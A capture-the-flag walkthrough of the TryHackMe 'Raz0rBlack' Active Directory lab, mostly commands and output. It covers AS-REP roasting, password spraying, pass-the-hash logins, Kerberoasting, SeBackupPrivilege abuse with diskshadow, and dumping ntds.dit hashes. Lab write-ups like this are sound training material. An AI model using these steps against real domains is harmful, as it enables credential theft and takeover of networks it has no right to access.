# Raz0rBlack tryhackme 

## Nmap

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-14 04:17:44Z)
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2022-11-14T04:18:44+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2022-11-13T04:15:34
|_Not valid after:  2023-05-15T04:15:34
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2022-11-14T04:18:35+00:00
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-11-14T04:18:37
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
```

nfs open after mount the files got flag and usernames.

```
daven port
imogen royce
tamara vidal
arthur edwards
carl ingram
nolan cassidy
reza zaydan
ljudmila vetrova
rico delgado
tyson williams
steven bradley
chamber lin
```
sorting this usernames as follows the sbradley.txt its like

```
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin
```

## ASREPRoasting

Running getNPUsers against the username got tgt of twilliams user.

```bash
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms/raz0rblack/smb]
└─$ sudo nano /etc/hosts                       
                                                                                                                                                                       
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms/raz0rblack/smb]
└─$ impacket-GetNPUsers raz0rblack.thm/twilliams -no-pass -request
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for twilliams
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:6b84d78b13354be6584c7b7a59cdad29$242f1b00649d1ffa0d23f13f652215477d43d1e65e6fc5481c68810da6555b6c8d0cc63efd9bb0a7e3f1ec7247ee769a1449de3ce6babf9283c3604f4c6b442a9d4fa8a42b10a631fa11dafaa4cac6f66cf5eaf13dc57945f6174eeaba847b9ab6fad50c8fc3008e2e498382a298f855cf6ca4f702a294afdb3e9469e32d751f0e9ed97ac9fc60c92d7a7ff0c727ad90af9c3b069b0bf723bc7dd18868f2848dc1101d17ae8b10d1457cd820494732814dc65af32fc5cf1f791a3453a21150ff7c915276eac49e23f757d4440aa071eee237d5479a8e5201f8db2040f7f51c74c63b0de0283aa151429179bf0cd7e3f4

``` 

hash cracked : twilliams:roastpotatoes

## SMB

```bash
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms]
└─$ crackmapexec smb 10.10.119.154 -u twilliams -p roastpotatoes --shares
SMB         10.10.119.154   445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.119.154   445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
SMB         10.10.119.154   445    HAVEN-DC         [+] Enumerated shares
SMB         10.10.119.154   445    HAVEN-DC         Share           Permissions     Remark
SMB         10.10.119.154   445    HAVEN-DC         -----           -----------     ------
SMB         10.10.119.154   445    HAVEN-DC         ADMIN$                          Remote Admin
SMB         10.10.119.154   445    HAVEN-DC         C$                              Default share
SMB         10.10.119.154   445    HAVEN-DC         IPC$            READ            Remote IPC
SMB         10.10.119.154   445    HAVEN-DC         NETLOGON        READ            Logon server share 
SMB         10.10.119.154   445    HAVEN-DC         SYSVOL          READ            Logon server share 
SMB         10.10.119.154   445    HAVEN-DC         trash                           Files Pending for deletion
```

IPC share has read permission that means we can brutefroce the user.

```bash
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms/raz0rblack/backupprivabuse]
└─$ crackmapexec smb 10.10.143.223 -u ../users.txt -p roastpotatoes 
SMB         10.10.143.223   445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.143.223   445    HAVEN-DC         [-] raz0rblack.thm\dport:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.143.223   445    HAVEN-DC         [-] raz0rblack.thm\iroyce:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.143.223   445    HAVEN-DC         [-] raz0rblack.thm\tvidal:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.143.223   445    HAVEN-DC         [-] raz0rblack.thm\aedwards:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.143.223   445    HAVEN-DC         [-] raz0rblack.thm\cingram:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.143.223   445    HAVEN-DC         [-] raz0rblack.thm\ncassidy:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.143.223   445    HAVEN-DC         [-] raz0rblack.thm\rzaydan:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.143.223   445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.143.223   445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE 
SMB         10.10.143.223   445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 

```

User sbradley has diffrent status that password must change lets go for it.

```bash                                        
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms]
└─$ smbpasswd -r 10.10.119.154 -U sbradley 
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user sbradley

```

The user's Old password is : roastpotatoes I changed it to raz0rblack

```bash                                                                                                                                                                      
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms]
└─$ crackmapexec smb 10.10.119.154 -u sbradley -p raz0rblack --shares
SMB         10.10.119.154   445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.119.154   445    HAVEN-DC         [+] raz0rblack.thm\sbradley:razorblack 
SMB         10.10.119.154   445    HAVEN-DC         [+] Enumerated shares
SMB         10.10.119.154   445    HAVEN-DC         Share           Permissions     Remark
SMB         10.10.119.154   445    HAVEN-DC         -----           -----------     ------
SMB         10.10.119.154   445    HAVEN-DC         ADMIN$                          Remote Admin
SMB         10.10.119.154   445    HAVEN-DC         C$                              Default share
SMB         10.10.119.154   445    HAVEN-DC         IPC$            READ            Remote IPC
SMB         10.10.119.154   445    HAVEN-DC         NETLOGON        READ            Logon server share 
SMB         10.10.119.154   445    HAVEN-DC         SYSVOL          READ            Logon server share 
SMB         10.10.119.154   445    HAVEN-DC         trash           READ            Files Pending for deletion

```

New share trash opened

```bash
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms]
└─$ smbclient //10.10.143.223/trash -U sbradley 
Password for [WORKGROUP\sbradley]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 02:01:28 2021
  ..                                  D        0  Tue Mar 16 02:01:28 2021
  chat_log_20210222143423.txt         A     1340  Thu Feb 25 14:29:05 2021
  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 02:02:20 2021
  sbradley.txt                        A       37  Sat Feb 27 14:24:21 2021

                5101823 blocks of size 4096. 948253 blocks available
smb: \> 

```

The encrypted zip file cracked using zip2john password is : electromagnetismo

The zip file has system.hive and ntds.dit files.

```bash
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms/raz0rblack/smb]
└─$ impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL > hashes2.txt 
                                                                                                                                                                       
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms/raz0rblack/smb]
└─$ impacket-secretsdump -system system.hive -ntds ntds.dit LOCAL              
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x17a0a12951d502bb3c14cf1d495a71ad
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 84bf0a79cd645db4f94b24c35cfdf7c7
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1afedc472d0fdfe07cd075d36804efd0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:4ea59b8f64c94ec66ddcfc4e6e5899f9:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:703a365974d7c3eeb80e11dd27fb0cb3:::
RAZ0RBLACK\j.smith:4549:aad3b435b51404eeaad3b435b51404ee:da3542420eff7cfab8305a68b7da7043:::
RAZ0RBLACK\j.johnson:4550:aad3b435b51404eeaad3b435b51404ee:c378739d7c136c1281d06183665702ea:::
RAZ0RBLACK\r.williams:4551:aad3b435b51404eeaad3b435b51404ee:9f73aaafc3b6d62acdbb0b426f302f9e:::
RAZ0RBLACK\m.jones:4552:aad3b435b51404eeaad3b435b51404ee:6a5bad944868142e65ad3049a393e587:::
RAZ0RBLACK\w.brown:4553:aad3b435b51404eeaad3b435b51404ee:b112332330f11267486d21549d326bd5:::
RAZ0RBLACK\d.davis:4554:aad3b435b51404eeaad3b435b51404ee:f9b8c9864aa7bc53405ed45b48ef19ef:::
RAZ0RBLACK\r.miller:4555:aad3b435b51404eeaad3b435b51404ee:efe1e7cd1799ef6dff3c85b36239ef17:::
RAZ0RBLACK\c.wilson:4556:aad3b435b51404eeaad3b435b51404ee:4104dd2ede9c241eb18bda7470310d91:::
RAZ0RBLACK\j.moore:4557:aad3b435b51404eeaad3b435b51404ee:d1d85bdc244f5d7185bcff43eea3ab53:::
RAZ0RBLACK\t.taylor:4558:aad3b435b51404eeaad3b435b51404ee:361e1f12cb92caf151fc925eaa1b50f4:::
RAZ0RBLACK\c.anderson:4559:aad3b435b51404eeaad3b435b51404ee:0d57dffbf71b62d021ea80c85b2e4ad3:::
RAZ0RBLACK\d.thomas:4560:aad3b435b51404eeaad3b435b51404ee:1a6c63def0c9586fc1d137416cc5a27a:::
RAZ0RBLACK\p.jackson:4561:aad3b435b51404eeaad3b435b51404ee:19d0d474d66bf927a8f20271887e38a5:::
RAZ0RBLACK\m.white:4562:aad3b435b51404eeaad3b435b51404ee:28a07ad78f72eab5086e9531cf090241:::
RAZ0RBLACK\d.harris:4563:aad3b435b51404eeaad3b435b51404ee:b903584d25237abcb98ecbbc1b9f7690:::
RAZ0RBLACK\g.martin:4564:aad3b435b51404eeaad3b435b51404ee:a2f55ef7732746457989e57f9d48f4e0:::
RAZ0RBLACK\k.thompson:4565:aad3b435b51404eeaad3b435b51404ee:4755e96189b69cd183488d2d3b75a027:::
RAZ0RBLACK\s.garcia:4566:aad3b435b51404eeaad3b435b51404ee:cf52509da95b757b8fa281b1ffb3dfd8:::
RAZ0RBLACK\e.martinez:4567:aad3b435b51404eeaad3b435b51404ee:9a216f144c1e754b994d0b1755bf3ebc:::
RAZ0RBLACK\b.robinson:4568:aad3b435b51404eeaad3b435b51404ee:4de044350706d6235dadd919e806a200:::
RAZ0RBLACK\r.clark:4569:aad3b435b51404eeaad3b435b51404ee:ccdaf9e89d45d0ea9e2c5090e424a417:::
RAZ0RBLACK\a.rodriguez:4570:aad3b435b51404eeaad3b435b51404ee:627d38df8df661adee501a063b221c2a:::
RAZ0RBLACK\k.lewis:4571:aad3b435b51404eeaad3b435b51404ee:7f5e1e8447ac0391379c2e0c08ea3430:::
RAZ0RBLACK\j.lee:4572:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RAZ0RBLACK\m.walker:4573:aad3b435b51404eeaad3b435b51404ee:5318563bb482edda0178f1b67b3325c4:::
RAZ0RBLACK\g.hall:4574:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RAZ0RBLACK\t.allen:4575:aad3b435b51404eeaad3b435b51404ee:3f004f987d34699bbccabab294faedca:::
RAZ0RBLACK\j.young:4576:aad3b435b51404eeaad3b435b51404ee:e7033dadf1ddef97591a44241accec7d:::
RAZ0RBLACK\l.hernandez:4577:aad3b435b51404eeaad3b435b51404ee:b54fbde75f44cb4b8a5e751978555faa:::
RAZ0RBLACK\j.king:4578:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
RAZ0RBLACK\f.wright:4579:aad3b435b51404eeaad3b435b51404ee:1df714847196491900e082cff2c81e07:::
RAZ0RBLACK\s.lopez:4580:aad3b435b51
```

Lot of hashes, Tryhackme asks 'What is Ljudmila's Hash?' ljudmila vetrova the user is 'lvetrova' and fire up the crackmapexec against this username and hash must be in our hashes.txt file

first I fillter the nthash seprately

	cat hashes2.txt | cut -d ":" -f 4 > filter_hashes.txt 


```bash

crackmapexec winrm 10.10.6.106 -u lvetrova -H filter_hashes.txt
WINRM       10.10.6.106     5985   HAVEN-DC         [-] raz0rblack.thm\lvetrova:7b8b14a73d8a45249de2f5b0c225d515
WINRM       10.10.6.106     5985   HAVEN-DC         [-] raz0rblack.thm\lvetrova:081af9630677a387f6f0a9bb17852602
WINRM       10.10.6.106     5985   HAVEN-DC         [-] raz0rblack.thm\lvetrova:c184a72ed800899bc1ff633778a89b5e
WINRM       10.10.6.106     5985   HAVEN-DC         [+] raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d (Pwn3d!)
                                                                                                                          
```

```bash
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms/raz0rblack]
└─$ evil-winrm -i 10.10.6.106 -u lvetrova -H f220d3988deb3f516c73f40ee16c431d      

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\lvetrova\Documents> cd ..
*Evil-WinRM* PS C:\Users\lvetrova> ls


    Directory: C:\Users\lvetrova


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:14 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:16 AM           1692 lvetrova.xml


*Evil-WinRM* PS C:\Users\lvetrova> cat lvetrova.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">Your Flag is here =&gt;</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb010000009db56a0543f441469fc81aadb02945d20000000002000000000003660000c000000010000000069a026f82c590fa867556fe4495ca870000000004800000a0000000100000003b5bf64299ad06afde3fc9d6efe72d35500000002828ad79f53f3f38ceb3d8a8c41179a54dc94cab7b17ba52d0b9fc62dfd4a205f2bba2688e8e67e5cbc6d6584496d107b4307469b95eb3fdfd855abe27334a5fe32a8b35a3a0b6424081e14dc387902414000000e6e36273726b3c093bbbb4e976392a874772576d</SS>
    </Props>
  </Obj>
</Objs>
*Evil-WinRM* PS C:\Users\lvetrova> $Credential = Import-Clixml -Path ".\lvetrova.xml"
*Evil-WinRM* PS C:\Users\lvetrova> $Credential.GetNetworkCredential().password
THM{694362e877axxxxxxxx92e6d17551fe4}


```

Next target Xyan1d3 try Kerberoasting with the lvetrova creds.


```bash
┌──(arun㉿kali)-[~/AD/AD-THM-Rooms/raz0rblack]
└─$ impacket-GetUserSPNs raz0rblack.thm/lvetrova -hashes aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d -request 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName                   Name     MemberOf                                                    PasswordLastSet             LastLogon  Delegation 
-------------------------------------  -------  ----------------------------------------------------------  --------------------------  ---------  ----------
HAVEN-DC/xyan1d3.raz0rblack.thm:60111  xyan1d3  CN=Remote Management Users,CN=Builtin,DC=raz0rblack,DC=thm  2021-02-23 10:17:17.715160  <never>               



$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$1342194bd0d13158baf2a93db4d8b6dc$3b5052fd6ec939b5f9ed5a4eb2755fd65c2f5d4d2d04a057dba4a25fbffcd94aabb06924ffdf92a49c57766870c6d50eb21ba3ce82b44a63259c16c1f0b309298d90ed287ec5746e6664a9ab66912934eb1ec5317a669325601036e5fce939c3f70cee2eff4c4c4ed38eda1f1de150df2b335af896fbf65d8f841ca1bf6c6d39b551ef9fdc1dc29f8831cf06f87e2ea395d2afe3adecd6064966170db67183c7985072359da69ff415e9894d44bed87c06e34b34279dc7261aa99ee7363cc71b6c6c928503d6cfbc9a7d03df62a6027ebd67f549193fb324a3c033adf801756021248f8b51d0e828e811b44cfd915a6e7a98f25be89e1bb4acdbac209aa76327839b33e331a8fff784c71f7441a7dcf14953955f044e8c064832a013d2f337e1121b9a7a2344abf244e7dbe1795ccd5ec476580c1518f2c925a59bb94a44233d973512556e150bd349e0a4d9b1638e453ceebb7563a2cfed681d3bf7119174efa840b3d656baeb296b5c7b14ecadd3e40240883d7aa764565b7da5bec614f9131113df533b9db2e51fb83940d3a9548e8da59f64af5ea365c18b97e54ed6ff50773a8fcc2ebab073c58928cf20ec575973140a2103af74fb48430ef4d032c2d3c767b0b41c726dfbc1005616b1d265e964cd99352165c56ddef5dddf08ecf2e4dfa2a5d2e3630a43a4fb0d6ed949f0c3b5f751443781705d96be4b2ac2efae64c14e93f856ae0deb61bcf59eb30bda0a224df360c87ab09466c35fc89923acf73019573e78f1628083ba235c398ae06c33e7cbb3554d0628fd59238cdb16635367b0a1e7dbf328ff55408d993850feb066db1b9ada6f3d0b90f3f4aa2ec7ab664eddde1e2bc691f5e81ec3be7589728d728cc3bea0f1f952151bcd026c45cbb411346ea3554a6de1d14473554eaa289c5e81350bac80c818e974d5e15f480a0570b80a6931ba604345d9221b03455a7ef49ad190559f21e3b93d4f7dda5bd2719cdb191fc1cd2622a6c425e2dfb94f159ba61c028eac4c9510c53f5d4fb2708f94160f1fec0d6931b2597f6641903bb57b574aab0c66dd3197b9d9318280d9fd6d42c654908903103ef1f8da92ea5994a9ba85f3296632a8342ac4a9442a641dfdc5966595d99a597e15d076d9bcaff4c19bcec17c6a55ba7e8f9f1b5052ff059b3cb58456662ddb990c9ed2142bd86c016f73f6772270775154c5aa177875228e2670bb69d526b9cbf165dc984ef4a8370b182be37d2ae7b90cd57ce8d4fd1ad4bccb79d5f0fb930db7dac2f0033bb152601cd8eab98565958a7a8dae7236deb27c734796f1d00446c61db616e1a0ead7f5d1d7a4d288784fd439c15e92e4f3d6016e9861c26d3cf271a33245112855bd7cc0fdfc0eec5a695bae7b29e15e5ad650b88c460cc426726c9c8b0ed487
```

hash cracked : xyan1d3:cyanide9amine5628

evil-winrm -i raz0rblack.thm -u xyan1d3 -p cyanide9amine5628                  

## privesc 

SeBackupPrivilege

https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/

```evil.txt
set context persistent nowriters
add volume c: alias arun
create
expose %arun% z:

```
```
wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll

wget https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll
```

follow this steps

```bash
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> cd /
*Evil-WinRM* PS C:\> mkdir /tmp


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/14/2022  10:52 PM                tmp


*Evil-WinRM* PS C:\> rm -r tmp
*Evil-WinRM* PS C:\> mkdir Temp


    Directory: C:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/14/2022  10:52 PM                Temp


*Evil-WinRM* PS C:\> cd Temp
*Evil-WinRM* PS C:\Temp> ls
*Evil-WinRM* PS C:\Temp> upload SeBackupPrivilegeUtils.dll
Info: Uploading SeBackupPrivilegeUtils.dll to C:\Temp\SeBackupPrivilegeUtils.dll

                                                             
Data: 21844 bytes of 21844 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Temp> upload SeBackupPrivilegeCmdLets.dll
Info: Uploading SeBackupPrivilegeCmdLets.dll to C:\Temp\SeBackupPrivilegeCmdLets.dll

                                                             
Data: 16384 bytes of 16384 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Temp> upload evil.txt
Info: Uploading evil.txt to C:\Temp\evil.txt

                                                             
Data: 112 bytes of 112 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Temp> Import-Module .\SeBackupPrivilegeUtils.dll

*Evil-WinRM* PS C:\Temp> 
*Evil-WinRM* PS C:\Temp> Import-Module .\SeBackupPrivilegeCmdLets.dll

*Evil-WinRM* PS C:\Temp> 
*Evil-WinRM* PS C:\Temp> diskshadow.exe /s evil.txt
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  HAVEN-DC,  11/14/2022 10:56:39 PM

-> set context persistent nowriters
-> add volume c: alias arun
-> create
Alias arun for shadow ID {5df91e4d-85e3-43c2-a87d-37dd7128e420} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {11a9b8fd-e56f-4206-8acc-4e7bb3097b89} set as environment variable.

Querying all shadow copies with the shadow copy set ID {11a9b8fd-e56f-4206-8acc-4e7bb3097b89}

        * Shadow copy ID = {5df91e4d-85e3-43c2-a87d-37dd7128e420}               %arun%
                - Shadow copy set: {11a9b8fd-e56f-4206-8acc-4e7bb3097b89}       %VSS_SHADOW_SET%
                - Original count of shadow copies = 1
                - Original volume name: \\?\Volume{115c1f55-0000-0000-0000-602200000000}\ [C:\]
                - Creation time: 11/14/2022 10:56:42 PM
                - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
                - Originating machine: HAVEN-DC.raz0rblack.thm
                - Service machine: HAVEN-DC.raz0rblack.thm
                - Not exposed
                - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
                - Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %arun% z:
-> %arun% = {5df91e4d-85e3-43c2-a87d-37dd7128e420}
The shadow copy was successfully exposed as z:\.
->
*Evil-WinRM* PS C:\Temp> Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit

*Evil-WinRM* PS C:\Temp> 
*Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system

The operation completed successfully.

*Evil-WinRM* PS C:\Temp> 
*Evil-WinRM* PS C:\Temp> ls


    Directory: C:\Temp


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/14/2022  10:56 PM            615 2022-11-14_22-56-42_HAVEN-DC.cab
-a----       11/14/2022  10:55 PM             86 evil.txt
-a----       11/14/2022  10:57 PM       16777216 ntds.dit
-a----       11/14/2022  10:55 PM          12288 SeBackupPrivilegeCmdLets.dll
-a----       11/14/2022  10:54 PM          16384 SeBackupPrivilegeUtils.dll
-a----       11/14/2022  10:58 PM       17219584 system


*Evil-WinRM* PS C:\Temp> download ntds.dit
Info: Downloading ntds.dit to ./ntds.dit

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Temp> download system
Info: Downloading system to ./system

                                                             
Info: Download successful!

*Evil-WinRM* PS C:\Temp> 
```

Again some impackets stuff

```bash
impcket-secretsdump -system system -ntds ntds.dit LOCAL

Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HAVEN-DC$:1000:aad3b435b51404eeaad3b435b51404ee:26cc019045071ea8ad315bd764c4f5c6:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fa3c456268854a917bd17184c85b4fd1:::
raz0rblack.thm\xyan1d3:1106:aad3b435b51404eeaad3b435b51404ee:bf11a3cbefb46f7194da2fa190834025:::
raz0rblack.thm\lvetrova:1107:aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d:::
raz0rblack.thm\sbradley:1108:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
raz0rblack.thm\twilliams:1109:aad3b435b51404eeaad3b435b51404ee:351c839c5e02d1ed0134a383b628426e:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:ab77c0dd6f5a28b63c4ae5f0eb89ad48f3ed43d52dc42f1dca2e99d8fc9cdbbf
Administrator:aes128-cts-hmac-sha1-96:81a749369e929b7f1731489b12a49df8
Administrator:des-cbc-md5:d3b646b65bceb5c7
HAVEN-DC$:aes256-cts-hmac-sha1-96:d6b41169e02a4543b90a8c697b167948413397c30f1bf5f0199a54f387358fc6
HAVEN-DC$:aes128-cts-hmac-sha1-96:5ed5bd57484ca826e09afa6e5b944c27
HAVEN-DC$:des-cbc-md5:f71a0dc89b9d079d
krbtgt:aes256-cts-hmac-sha1-96:eed4acbdf1b6cc2b3c1aef992a8cea74d8b0c4ad5b4deecf47c57c4d9465caf5
krbtgt:aes128-cts-hmac-sha1-96:3dbbd202aa0343d1b8df99785d2befbb
krbtgt:des-cbc-md5:857a46f13e91eae3
raz0rblack.thm\xyan1d3:aes256-cts-hmac-sha1-96:6de380d21ae165f55e7520ee3c4a81417bf6a25b17f72ce119083846d89a031f
raz0rblack.thm\xyan1d3:aes128-cts-hmac-sha1-96:9f5a0114b2c18ea63a32a1b8553d4f61
raz0rblack.thm\xyan1d3:des-cbc-md5:e9a1a46223cd8975
raz0rblack.thm\lvetrova:aes256-cts-hmac-sha1-96:3809e38e24ecb746dc0d98e2b95f39fc157de38a9081b3973db5be4c25d5ad39
raz0rblack.thm\lvetrova:aes128-cts-hmac-sha1-96:3676941361afe1800b8ab5d5a15bd839
raz0rblack.thm\lvetrova:des-cbc-md5:385d6e1f1cc17fb6
raz0rblack.thm\sbradley:aes256-cts-hmac-sha1-96:ddd43169c2235d3d2134fdb2ff4182abdb029a20724e679189a755014e68bab5
raz0rblack.thm\sbradley:aes128-cts-hmac-sha1-96:7cdf6640a975c86298b9f48000047580
raz0rblack.thm\sbradley:des-cbc-md5:83fe3e584f4a5bf8
raz0rblack.thm\twilliams:aes256-cts-hmac-sha1-96:05bac51a4b8888a484e0fa1400d8f507b195c4367198024c6806d8eb401cb559
```

## Root && Tyson

	evil-winrm -i 10.10.143.223 -u administrator -H 9689931bed40ca5a2ce1218210177f0c


```bash
*Evil-WinRM* PS C:\Users\twilliams> type definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_definitely_not_a_flag.exe
THM{5144f2c410xxxxxxxx4916724e3749fb0}
```




